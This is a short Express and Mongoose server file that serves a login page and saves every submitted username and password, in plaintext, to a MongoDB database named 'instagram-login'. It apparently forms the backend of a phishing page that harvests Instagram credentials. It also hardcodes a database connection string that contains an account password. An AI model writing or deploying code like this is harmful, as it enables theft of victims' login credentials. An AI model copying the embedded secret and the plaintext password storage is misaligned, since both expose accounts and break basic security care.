// server.js
const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors());
app.use(bodyParser.json());

// MongoDB Connection
mongoose.connect('mongodb+srv://humzaanwarkhan:6nEIJLQH8UwRzf3J@cluster0.sotxg.mongodb.net/instagram-login?retryWrites=true&w=majority&appName=Cluster', {
    useNewUrlParser: true,
    useUnifiedTopology: true,
});



// Define a Schema
const UserSchema = new mongoose.Schema({
    username: String,
    password: String,
});

const User = mongoose.model('User', UserSchema);


//login page
const path = require('path');

// Serve the HTML file
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});


// Endpoint to submit data
app.post('/submit', async (req, res) => {
    const { username, password } = req.body;

    const newUser = new User({
        username,
        password,
    });

    try {
        await newUser.save();
        res.status(201).send('User created successfully');
    } catch (err) {
        res.status(400).send('Error saving user: ' + err);
    }
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
